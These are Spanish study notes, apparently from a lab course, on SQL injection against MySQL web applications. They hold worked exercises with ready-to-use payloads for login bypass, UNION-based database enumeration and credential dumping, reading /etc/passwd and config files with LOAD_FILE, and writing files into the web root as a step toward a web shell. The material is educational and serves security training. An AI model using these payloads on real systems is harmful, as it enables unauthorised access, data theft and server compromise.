25-11-2024 18:54
Status: #idea
Tags: 

# SQL Injections
- [[#SQL Injection (SQLi)|SQL Injection (SQLi)]]
- [[#Syntax Errors|Syntax Errors]]
- [[#Tipos de SQL Injections|Tipos de SQL Injections]]
- [[#Authentication Bypass|Authentication Bypass]]
	- [[#Authentication Bypass#Operador OR|Operador OR]]
	- [[#Authentication Bypass#Ejercicio Resuelto|Ejercicio Resuelto]]
	- [[#Authentication Bypass#Usando comentarios|Usando comentarios]]
		- [[#Usando comentarios#Otro ejemplo|Otro ejemplo]]
		- [[#Usando comentarios#Ejercicio Resuelto|Ejercicio Resuelto]]
	- [[#Authentication Bypass#Union Clause|Union Clause]]
		- [[#Union Clause#Columnas pares|Columnas pares]]
		- [[#Union Clause#Columnas impares|Columnas impares]]
		- [[#Union Clause#Ejercicio Resuelto|Ejercicio Resuelto]]
	- [[#Authentication Bypass#Union Injection|Union Injection]]
		- [[#Union Injection#Descubrir el número de columnas|Descubrir el número de columnas]]
			- [[#Descubrir el número de columnas#Order By|Order By]]
			- [[#Descubrir el número de columnas#Union|Union]]
	- [[#Authentication Bypass#Location of Injection|Location of Injection]]
		- [[#Location of Injection#Ejercicio Resuelto|Ejercicio Resuelto]]
- [[#Enumeración de base de datos|Enumeración de base de datos]]
	- [[#Enumeración de base de datos#INFORMATION_SCHEMA Database|INFORMATION_SCHEMA Database]]
		- [[#INFORMATION_SCHEMA Database#SCHEMATA|SCHEMATA]]
		- [[#INFORMATION_SCHEMA Database#TABLES|TABLES]]
		- [[#INFORMATION_SCHEMA Database#COLUMNS|COLUMNS]]
		- [[#INFORMATION_SCHEMA Database#Data|Data]]
	- [[#Enumeración de base de datos#Ejercicio Resuelto|Ejercicio Resuelto]]
- [[#Leyendo ficheros|Leyendo ficheros]]
	- [[#Leyendo ficheros#Privilegios|Privilegios]]
		- [[#Privilegios#DB User|DB User]]
		- [[#Privilegios#Privilegios de usuario|Privilegios de usuario]]
		- [[#Privilegios#LOAD_FILE|LOAD_FILE]]
		- [[#Privilegios#Ejercicio Resuelto|Ejercicio Resuelto]]
- [[#Escribiendo ficheros|Escribiendo ficheros]]
	- [[#Escribiendo ficheros#secure_file_priv|secure_file_priv]]
	- [[#Escribiendo ficheros#SELECT INTO OUTFILE|SELECT INTO OUTFILE]]
	- [[#Escribiendo ficheros#Escribiendo en ficheros con SQL Injection|Escribiendo en ficheros con SQL Injection]]
	- [[#Escribiendo ficheros#Escribiendo una Web Shell|Escribiendo una Web Shell]]
	- [[#Escribiendo ficheros#Ejercicio Resuelto|Ejercicio Resuelto]]


La mayoría de aplicaciones tienen una base de datos para guardar información de lo que sucede en la aplicación. Para conseguir que la web sea dinámica, se necesita interactuar en tiempo real con la base de datos.

El flujo de funcionamiento es el siguiente:

1- El usuario hace una petición.
2- Llega a la aplicación.
3- Se traslada al back-end de la aplicación.
4- Desde el back-end de la aplicación, se contacta con la base de datos y se recupera lo solicitado.

![[Pasted image 20241125185612.png]]

## SQL Injection (SQLi)

Hay muchos tipos de inyecciones que se pueden realizar en web apps, tales como HTTP Injection, code injection y command injection, pero el más común de todos, son sin duda los SQL Injections.

Su funcionamiento es sencillo, el usuario malintencionado hará un uso de un campo input, para modificar la query final que se envía a la base de datos, devolviendo así información que el usuario no debería de ver, o obteniendo control sobre la base de datos.

Hay muchas maneras de conseguir esto, pero lo más normal es que el atacante inyecte código SQL en un input que no tiene validaciones correctas. El caso más básico de inyecciones SQL, sería usar apóstrofes (') o ("), para romper el string del back-end, y así poder inyectar la query maliciosa.

Una vez el atacante comprueba que puede hacer inyecciones SQL, tendrá que ejecutar otras queries para obtener información, o para alterar el funcionamiento de la base de datos. Normalmente, se utilizan [stacked queries](https://www.sqlinjection.net/stacked-queries/) o también con [unions](https://www.mysqltutorial.org/sql-union-mysql.aspx/).

El impacto de una inyección SQL puede ser devastador, sobre todo si los permisos en el back-end y la base de datos son muy laxos. 

- Para empezar, podríamos recuperar los datos que queríamos, obteniendo así acceso a información "protegida". Además, este tipo de vulnerabilidad puede provocar un breach de datos y contraseñas.
- Otro caso de uso sería poder acceder a cuentas de usuario sin necesitar las credenciales, ya que vulneraríamos la comprobación de contraseña con una inyección. Esto nos daría acceso a paneles de administración. Por otro lado, los atacantes también podrían leer y escribir en ficheros del back-end, lo que puede permitir la creación de back doors en nuestra aplicación, consiguiendo así control total de nuestra web.

Para prevenir este tipo de vulnerabilidad, deberemos asegurarnos de que el código de nuestra web es fuerte y seguro, además de tener permisos especificados en nuestra base de datos y tener un back-end que haga comprobaciones antes de llamar a la base de datos.

## Syntax Errors

```php
Error: near line 1: near "'": syntax error
```

Es común encontrarnos con errores de sintaxis cuando estamos haciendo payloads y probándolas. Normalmente este problema se debe a que no estamos cerrando bien los apóstrofes o hemos escrito algo mal.


## Tipos de SQL Injections

Se caracterizan por cuando y como conseguimos acceder a los datos.

![[Pasted image 20241126183711.png]]

En casos sencillos, el output será mostrado por pantalla en el front-end, pudiendo así leerlo directamente. Esto se conoce como In-band, y tiene dos tipos: **Union Based**, y **Error Based**.

Con el **Union Based** podremos especificar la localización específica para que la query vuelque los datos ahí. Mientras que la **Error Based**, se identifica cuando podemos los errores de PHP o SQL en el front-end, lo que nos permitirá crear un error SQL que nos devuelva el resultado de nuestra query.

En casos más complicados, no veremos el output en el front-end, por lo que tendremos que utilizar lógica SQL para conseguir ver el output caracter a caracter. Esto se conoce como **Blind SQL Injection**, y tiene dos tipos: **Boolean Based** y **Time Based**.

Con el tipo **Boolean Based** podremos usar statements para controlar si una página nos devuelve algo de output, por ejemplo 'original query response', si nuestra condición es true. Mientras que las inyecciones **Time Based**, podremos usar queries de SQL para por ejemplo, introducir una pequeña delay con la sentencia Sleep().

Y finalmente, en algunos casos no tendremos acceso directo al output, por lo que tendremos que dirigir el output a una localización remota, como un registro DNS, esperando recuperar el output desde ahí. Esto se conoce como inyección **Out-of-band**.

## Authentication Bypass

En el siguiente panel de administración podremos ver el funcionamiento de una inyección SQL para burlar la seguridad de este.

![[Pasted image 20241126185850.png]]

Si nos logeamos con el usuario admin y la contraseña p@ssw0rd, funcionará y podremos logearnos como admin. Pero, ¿podríamos acceder al panel sin saber la contraseña?

![[Pasted image 20241126185917.png]]

La query que se está ejecutando es la siguiente:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

Vemos como la página está recuperando los parámetros que enviamos, tanto el username como el password y usándolos directamente en la query.

Esto es una luz verde para las SQL injection, ya que este es el tipo de código que nos permitirá vulnerar la seguridad.

Para confirmar que este panel es vulnerable, tendremos que añadir algunas de estas payloads, siendo la primera columna el caracter a usar, y la segunda su traducción en la URL (URL encoding):

`'`: `%27`
`"`: `%22`
`#`:`%23`
`;`:`%3B`
`)`:`%29`

Tendremos que usar el URL encoding en caso de que queramos/tengamos que probar a hacer la payload en peticiones GET, por ejemplo, si no tuviésemos el input para probar directamente.

En este caso vemos que si añadimos un apóstrofe sencillo, cambia el funcionamiento y salta un error.

![[Pasted image 20241126191744.png]]

Y nos da un error de sintaxis, que se debe a que no están bien cerrados los apóstrofes. Y aquí es donde entra en juego el operador OR.

### Operador OR

Una payload que serviría en este caso sería la siguiente:

```sql
admin' or '1'='1
```

Donde ponemos una condición que siempre será true (1=1) y otra que sabemos que es true en este caso, que sería el username igual a admin, quedando nuestra query así:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

Por lo tanto el resumen sería:

- Si el nombre de usuario es admin
	OR
- Si 1=1 devuelve true (que siempre es true)
	AND
- Si la contraseña es 'something'

Aquí tenemos un diagrama que lo explica:

![[Pasted image 20241126192024.png]]
Esto nos terminará devolviendo true, y permitiéndonos entrar en el panel de administración.

> [!NOTA]
> La query que hemos usado arriba es una de las muchas que podremos ver en  [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
> 

### Ejercicio Resuelto

Se nos presenta este panel de administración, que como podemos intuir, es vulnerable a inyecciones SQL. Para afirmar esto, probaremos a introducir caracteres como ' o ", y comprobar si nos devuelve algún mensaje de error.

![[Captura de pantalla 2024-11-26 a las 19.31.11.png]]

Efectivamente, si introducimos tom' veremos como nos salta un syntax error.

![[Captura de pantalla 2024-11-26 a las 19.32.38.png]]

A partir de aquí tendremos que probar payloads y ver como va reaccionando la query mostrada por pantalla.

Quedando el payload final así: 

```
tom' OR '1'='1
```


### Usando comentarios

En esta sección vamos a ver como usar comentarios para ayudarnos a crear payloads más complejas.

Como cualquier otro lenguaje, SQL nos permite hacer comentarios. Los comentarios son útiles por si queremos dejar una parte de una query comentada, y que así no se ejecute, o también para explicar que hace una query.

```shell-session
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```

También podremos usar el símbolo `#`:

```shell-session
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

¿Y como podremos usar esto para hacer un authentication bypass?

Pues dejando nuestra query de la siguiente manera:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

Consiguiendo así que todo lo que venga después de admin no se ejecute, y esto nos permitiría logearnos de manera instantánea.

#### Otro ejemplo

![[Pasted image 20241126194104.png]]

SQL permite el uso de paréntesis para permitir que se haga check de condiciones antes que otras.

En este ejemplo en concreto, vemos que se asegura de que el id siempre sea mayor que 1, también vemos que la contraseña está hasheada, lo que no nos permitirá usar este campo para intentar la inyección.

Si intentamos entrar con credenciales válidas de admin no nos dejará, ya que el id es 1:

![[Pasted image 20241126194252.png]]

Si intentamos entrar con el usuario de tom, veremos que si que nos deja, ya que la id es mayor que 1:

![[Pasted image 20241126194337.png]]

Y como podríamos hacer para entrar como admin? Pues haciendo una inyección con comentarios y cerrando el paréntesis antes del AND:

```
admin')--
```

Dejándonos entrar en el panel correctamente:

![[Pasted image 20241126194436.png]]

#### Ejercicio Resuelto

Se nos presenta con este panel de administración que ejecuta la query y se nos pide que entremos con el usuario con id 5:

![[Captura de pantalla 2024-11-26 a las 20.13.21.png]]

```
SELECT * FROM logins WHERE (username='tom' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```

Podríamos ignorar la instrucción del id 5 y entrar con el usuario tom, pero este no tiene el id 5.

Por lo tanto tendremos que encontrar la manera de cerrar la variable username y hacerle ver a la query que somos el usuario con id 5.

Esto lo podemos conseguir con la payload: 

```
' OR id = 5) -- '
```

Dejando la query final así:

```
SELECT * FROM logins WHERE (username='' OR id = 5) -- '' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```


### Union Clause

Esta sentencia de SQL se usa para combinar los resultados de múltiples SELECT. Esto quiere decir que con una inyección UNION podremos leer datos de las tablas que queramos dentro del DMBS, incluso de otras bases de datos. Vamos a ver un ejemplo en una base de datos de muestra:

```shell-session
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```

```shell-session
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

Usando el UNION en las tablas tendremos este resultado, ya que se han combinado los resultados y se han volcado los datos de la tabla ships en la tabla ports.

```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

> [!IMPORTANTE]
> El tipo de datos tiene que ser exactamente igual al hacer el UNION, si no fallará.

#### Columnas pares

Para que el UNION funcione, necesitaremos que se usen el mismo número de columnas en ambas tablas. Por ejemplo, si intentamos hacer un UNION cuando hay diferente número de columnas, obtendremos este mensaje:

```shell-session
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

Una vez que tengamos el mismo número de columnas, podremos ejecutar el UNION sin problema alguna, por ejemplo:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

Este UNION nos devolverá el username y el password de la tabla passwords volcado en la tabla products, asumiendo que la tabla de products tenga 2 columnas.

#### Columnas impares

En la mayoría de los casos no vamos a tener tanta suerte y que las columnas de una tabla sean el mismo número que las de la otra tabla. Pero hay maneras de solucionar esto. La más común es meter "basura" en nuestra query SQL. Podríamos hacer queries como las siguientes:

```sql
SELECT "junk" from passwords
```

```sql
SELECT 1 from passwords
```

Esto nos devolverá "junk" y 1 respectivamente.

> [!info] IMPORTANTE
> Cuando rellenemos con datos basura, tenemos que asegurarnos que los tipos de datos son iguales, si no la query no funcionará. Por simplicidad, usaremos números, ya que también nos ayudarán a llevar cuenta de las posiciones en nuestra payload.

> [!tip] TIP
> Para inyecciones SQL avanzadas, podríamos usar 'NULL' para rellenar columnas, ya que se adapta a todo tipo de datos.

Conociendo esto, nos quedarán queries como esta:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

Si tuviésemos más columnas, tendríamos que modificar el UNION y añadir más números:

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

Esto devolverá algo así:

```shell
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

#### Ejercicio Resuelto

El enunciado nos dice lo siguiente: 

Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.

Una vez conectados vemos que tenemos dos tablas, una llamada employees y otra departments, como estamos conectados directamente a la base de datos podremos usar estos comandos:

```sql
DESCRIBE employees;
```

```sql
DESCRIBE departments;
```

Esto nos permitirá ver que columnas tiene employees y cuales tiene departments, y posteriormente podremos preparar nuestra query para hacer el union.

Employees en este caso tiene 6 columnas, y departments 2, por lo tanto la query quedaría así:

```sql
SELECT * FROM employees UNION SELECT dept_no, dept_name, 1,2,3,4 FROM departments
```

### Union Injection

Ahora que sabemos que son las cláusulas UNION podremos empezar a entender que son este tipo de inyecciones.

Se nos presenta esta web, y si probamos una payload sencilla como un apóstrofe tendremos un syntax error.

![[Pasted image 20241127190532.png]]

Esto nos indica que posiblemente sea vulnerable a inyecciones SQL.

#### Descubrir el número de columnas

Para descubrir el número de columnas que hay, podremos comenzar usando un ORDER BY. Con esto incrementaremos el número de columnas, hasta que nos devuelva un error. Al darnos este error, sabremos el número de columnas que tiene la tabla.

##### Order By

Es seguro que hay al menos una columna en la tabla, por lo tanto podríamos empezar con el siguiente payload:

```sql
' order by 1-- -
```

Ahora tendremos que ir incrementándola de 1 en uno, por ejemplo, order by 2, order by 3, etc. Si nos da un error en order by 4, pues nos estará diciendo que la tabla tiene 3 columnas.

##### Union

Esto se puede hacer también con el UNION, incrementado el número de columnas que le pasamos, por ejemplo:

```sql
cn' UNION select 1,2,3,4-- -
```

Seguiríamos haciendo sucesivamente: 1,2,3,4,5 hasta que funcione bien, ya que con el UNION el error que nos da es inverso al ORDER BY, ya que nos indica que que el SELECT tiene un distinto número de columnas.

Esto es lo que veríamos si tenemos que seguir añadiendo columnas:

![[Pasted image 20241127191254.png]]

Y esto si ha salido bien:

![[Pasted image 20241127191320.png]]

Una vez sepamos cuantas columnas tiene nuestro objetivo, podremos pasar al siguiente paso y comenzar a formar payloads.

### Location of Injection

La ubicación de la inyección va a depender de lo que se nos esté mostrando, ya que como vemos en la imagen de abajo, con nuestra payload UNION habíamos puesto 1,2,3,4 y solo se muestran 2,3,4. Esto es común, ya que hay campos que no interesa mostrar al usuario, como por ejemplo, el id.

Por lo tanto, no deberíamos poner nuestra inyección al principio, ya que si no, no se vería.

![[Pasted image 20241127191320.png]]

Este es uno de los beneficios que nos aporta usar números como data basura, ya que nos permitirá ver directamente las posiciones.

Para probar que podemos obtener datos de la base de datos, probaremos directamente la query @@version.

```sql
cn' UNION select 1,@@version,3,4-- -
```

Con lo que obtendremos esto:

![[Pasted image 20241127191742.png]]

#### Ejercicio Resuelto

Se nos presenta este panel:
![[Captura de pantalla 2024-11-27 a las 19.21.05.png]]

Mi primer instinto es probar a poner cualquier cosa en el search box, y veremos como está filtrando, presuntamente de una base de datos.

Para probar si es vulnerable, podremos usar un apóstrofe y veremos que saltan errores sintácticos:

![[Captura de pantalla 2024-11-27 a las 19.22.10.png]]

Automáticamente, voy a buscar el número de columnas que hay disponibles, usando quieres como el union select, por lo que he llegado a usar esta payload:

```sql
a' UNION select 1,2,3 -- -
```

Como vemos, nos da error de número de columnas:

![[Captura de pantalla 2024-11-27 a las 19.24.52.png]]

Si subimos a 4, funcionará, por lo que veremos esto:

![[Captura de pantalla 2024-11-27 a las 19.25.36.png]]

A partir de aquí, podremos substituir el número 2,3,4 por lo que querremos ejecutar, en este caso la función user(), quedando la query así:

```sql
a' UNION select 1,user(),3,4 -- -
```

Mostrándonos así el usuario activo en bbdd:

![[Captura de pantalla 2024-11-27 a las 19.26.39.png]]

## Enumeración de base de datos

Ahora que ya sabemos que payloads son las que nos permiten recibir información de la base de datos, en esta sección dejaré apuntes sobre funciones que podremos usar para recuperar información propia de la base de datos.

SELECT @@version: Nos permite saber que versión de MSSQL se está utilizando, y nos dará un error si se está utilizando con otro DBMS que no sea este.

SELECT POW(1,1): Nos devolverá un 1 si es MySQL, si no, nos dará un error.

SELECT SLEEP(5): Nos devolverá un 0, y tardará 5 segundos en enviar la respuesta. En otros DBMS no habrá el delay de 5 segundos.

### INFORMATION_SCHEMA Database

Esta base de datos contiene toda la información que necesitemos, como listado de bases de datos, el listado de tablas de cada base de datos, y el listado de columnas de cada tabla.

#### SCHEMATA

Para comenzar nuestra enumeración deberemos de saber que bases de datos están disponibles en nuestro DBMS. La tabla SCHEMATA nos proporcionará esto y podremos acceder a ella con la siguiente query:

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

Lo que nos permitiría usarla de esta manera en un contexto de inyección SQL:

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Lo que nos proporcionaría lo siguiente:

![[Pasted image 20241127194455.png]]

También podremos usar la función database() para ver el nombre de la base de datos:

```sql
cn' UNION select 1,database(),2,3-- -
```

Lo que nos devolverá el nombre de la base de datos:

![[Pasted image 20241127194530.png]]

#### TABLES

Ahora para sacar información de la base de datos, necesitaremos saber que tablas tenemos, por lo que podremos usar las columnas TABLE_SCHEMA y TABLE_NAME que estarán relacionadas con TABLE_SCHEMA (nombre de la base de datos), siendo TABLES la tabla que tenemos que usar de INFORMATION_SCHEMA.

Quedándonos una query así:

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Y dándonos un resultado así:

![[Pasted image 20241127194723.png]]

Esto nos permitirá ver que hay 4 tablas en la base de datos 'dev'.

#### COLUMNS

Y ahora, para saber que sacar de cada tabla, necesitaremos saber que columnas hay. Por ejemplo, nos interesaría la tabla credentials, por lo que haríamos la query a la tabla COLUMNS de INFORMATION_SCHEMA, con la condición where del nombre de la tabla. Resultando así en la siguiente query:

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

Y ahora conseguiremos ver las columnas que tiene esta tabla:

![[Pasted image 20241127195002.png]]

#### Data

Ahora que tenemos toda esta información, queremos extraer los datos de estas columnas. Para esto tendremos que volver a nuestra query UNION SELECT del inicio, y poner el nombre de las columnas que queramos en nuestra payload, siguiendo de la cláusula from y la base de datos que queremos usar y la tabla:

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

Resultando en lo siguiente:

![[Pasted image 20241127195128.png]]

### Ejercicio Resuelto

Se nos presenta la web del laboratorio anterior, por lo que ya sabemos que es vulnerable.

Procedemos a hacer una payload que nos permita ver los nombres de las bases de datos.

```sql
cn' UNION SELECT 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA -- -
```

![[Captura de pantalla 2024-11-27 a las 19.54.31.png]]

Perfecto, tenemos 5 bases de datos posibles, ahora necesitaremos saber cual es la que está activa:

```sql
cn' UNION select 1,database(),2,3-- -
```

![[Captura de pantalla 2024-11-27 a las 19.55.30.png]]

Ahora vemos que la base de datos activa es la que se muestra en pantalla.

Procederemos a ver que tablas hay dentro de esta base de datos con esta payload:

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
```

![[Captura de pantalla 2024-11-27 a las 19.56.54.png]]

Ahora vemos las 3 tablas que hay en esta base de datos, nuestro interés está puesto en la tabla users, por lo que nos interesa saber que columnas tiene esta tabla, para lo que usaremos la siguiente payload:

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```

Hemos conseguido ver que columnas forman esta tabla, por lo que nuestro foco está puesto en la columna password, así que ya tenemos lo suficiente para recuperar la password del usuario 'newuser'.

![[Captura de pantalla 2024-11-27 a las 19.58.51.png]]

```sql
cn' UNION SELECT 1,password,3,4 from ilfreight.users WHERE username = 'newuser' -- -
```

Y esto nos proporcionará la flag que necesitamos.

## Leyendo ficheros

A parte de recuperar datos de la base de datos, una inyección SQL puede servir para muchas otras operaciones, como leer o escribir ficheros en el servidor, pudiendo incluso ganar un RCE en el servidor.

### Privilegios

Leer datos es mucho más común que escribir datos, por lo tanto el usuario necesitará permisos explícitos para esto. Por ejemplo, para subir un archivo SQL y volcar los datos en una tabla, en MySQL, se necesitaría el permiso FILE, por lo que tendremos que saber si nuestro usuario tiene esta operación permitida para realizarla.

#### DB User

Antes de nada deberemos saber que usuario de la base de datos somos, lo cual podemos conseguir con la función user() o cualquier de estas 3 queries:

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Nuestra payload con UNION quedará de la siguiente manera:

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

O así:

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Lo que nos dirá que usuario somos actualmente:

![[Pasted image 20241127202020.png]]

Si conseguimos un usuario root, es muy buena señal, ya que suele ser el usuario con permisos máximos.

#### Privilegios de usuario

Para listar los privilegios de nuestro usuario podríamos usar este payload, ya que listará los privilegios de todos los usuarios:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

O este payload, que es específico a un usuario:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

Vemos como la query devuelve Y, que es YES, indicando que tenemos privilegios de superusuario.

![[Pasted image 20241127202223.png]]

Si queremos ver los permisos de manera individual, podremos ejecutar el siguiente payload:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

Devolviéndonos lo siguiente:

![[Pasted image 20241127202505.png]]

Como podemos ver, el permiso FILE está listado.

#### LOAD_FILE

Ahora que sabemos que tenemos privilegios suficientes, podremos intentar cargar un archivo para leer los datos que contiene, ya que MySQL/MariaDB tienen una función llamada LOAD_FILE() que nos permite exactamente esto.

Con esta payload, podríamos leer el fichero /etc/passwd:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

![[Pasted image 20241127202713.png]]

Devolviéndonos así el contenido del fichero.

Otro ejemplo, podríamos leer ficheros dentro del servidor, por ejemplo, sabemos que estamos usando el fichero search.php, por lo tanto podríamos hacer lo siguiente:

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

![[Pasted image 20241127202803.png]]

Siendo interesante ver el código source, ya que nos encontraremos una sorpresa. Podemos ver el contenido del fichero php en texto plano.

![[Pasted image 20241127202835.png]]

#### Ejercicio Resuelto

En este ejercicio se nos pide que descubramos de donde viene la variable $conn, ya que seguramente venga de un fichero importado con require, el problema es que no sabemos que ficheros hay en el servidor.

Para esto lanzo este comando de fuff con nuestro objetivo, y filtrando por extensión php:

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://94.237.60.154:36506/FUZZ.php -ic
```

![[Captura de pantalla 2024-11-27 a las 20.33.13.png]]


Vemos en los resultados que es un fichero llamado config.php, por lo tanto podremos incluirlo con nuestra inyección SQL y leerlo con la siguiente payload:

```sql
cn' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4 -- -
```

Y esto nos devolverá el fichero de configuración en texto plano, lo que nos permite leer la contraseña de la base de datos.

## Escribiendo ficheros

Cuando hablamos de escribir ficheros nos encontramos con que es una funcionalidad mucho más restringida en DBMS modernos, ya que esto nos permitiría escribir una web shell y ganar control total de este. 

Por esta misma razón, tendremos que comprobar que esta operación está entre nuestros permisos.

Para que podamos escribir en ficheros se deben cumplir estes 3 requisitos:

- Usuario tiene privilegios FILE.
- La variable global de MySQL secure_file_priv no está habilitada.
- Tener permisos de escritura en el directorio del servidor back-end que queramos escribir.

### secure_file_priv

Esta variable determina desde donde se pueden leer/escribir archivos. Un valor vacío nos permite leer ficheros del sistema entero. 

Mientras que, si un directorio está especificado en esta variable, solo podremos leer en este directorio. 

Por otra parte, NULL nos indica que no podremos leer ni escribir desde ningún directorio. 

MariaDB por defecto tiene la variable a una cadena vacía, lo que nos permitiría leer/escribir a cualquier fichero si el usuario tiene privilegios de FILE. De todas maneras, MySQL usa la carpeta /var/lib/mysql-files como directorio default. Esto quiere decir, que leer ficheros con una inyección SQL no es posible con ajustes por defecto. Y aún peor, hay algunas configuraciones más modernas que lo inicializan a NULL, no pudiendo leer/escribir.

Podemos usar la siguiente query para ver el valor de esta variable:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Pero, si estamos usando una inyección UNION, tendremos que obtener el valor usando un SELECT. 

Esto no sería un problema ya que las variables globales se pueden llamar desde INFORMATION_SCHEMA, en la tabla GLOBAL_VARIABLES.

Esto resultaría en la siguiente payload:

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Mostrando por pantalla el nombre de la variable y el valor, en este caso es '', por lo tanto podremos leer/escribir en cualquier parte del sistema.

![[Pasted image 20241127204604.png]]

Ahora que sabemos que nuestro usuario puede escribir en el back-end, vamos a probarlo.

### SELECT INTO OUTFILE

Para usar este statement, podremos añadir INTO OUTFILE '...' después de nuestra query para exportar los resultados en un fichero específicado. El ejemplo de abajo guarda el resultado de users en el directorio 'tmp/credentials':

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

Si volvemos al servidor del back-end, veremos el siguiente fichero y su contenido:

```shell
cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

También podremos escribir lo que queramos en el fichero con los SELECT de la siguiente manera:

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```shell
cat /tmp/test.txt 

this is a test
```

```shell
ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

Como podemos ver, el archivo ha sido creado por el usuario mysql.

> [!TIP]
> La exportación de ficheros avanzada utiliza la función 'FROM_BASE64("base64_data")' para conseguir escribir ficheros más largos/avanzados, incluyendo data binaria.


### Escribiendo en ficheros con SQL Injection

Vamos a escribir un fichero para comprobar que esto está funcionando bien. La query de abajo escribirá file written succesfully! en el fichero proof.txt

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

> [!DANGER] IMPORTANTE
> Para poder escribir una webshell deberemos saber en que directorio está el servidor web (web root). Una manera de saber esto es usando LOAD_FILE con el fichero de configuración del servidor.
> - Para Apache es: `/etc/apache2/apache2.conf`
> - Para NGINX es: `/etc/nginx/nginx.conf`
> - Para ISS es: `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
> 
> Incluso podríamos hacer un fuzzing scan y probar a escribir ficheros a diferentes web roots posibles, usando  [esta wordlist para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [esta wordlist para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).
> 
> Finalmente, si esto tampoco funciona, podríamos usar los errores de servidores que se dan, al por ejemplo, poner rutas mal, etc, e identificar el web directory de esa manera.

Nos quedaría así la payload final:

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

No vemos ningún error, por lo que posiblemente haya funcionado. Y podremos comprobar que efectivamente ha funcionado al ir a /proof.txt en nuestro servidor.

![[Pasted image 20241127210138.png]]

Se puede ver como en el fichero se han introducido los valores 1,3,4 ya que esto es por la inyección, podremos solucionar esto poniendo los valores "" en la inyección en vez de números.

### Escribiendo una Web Shell

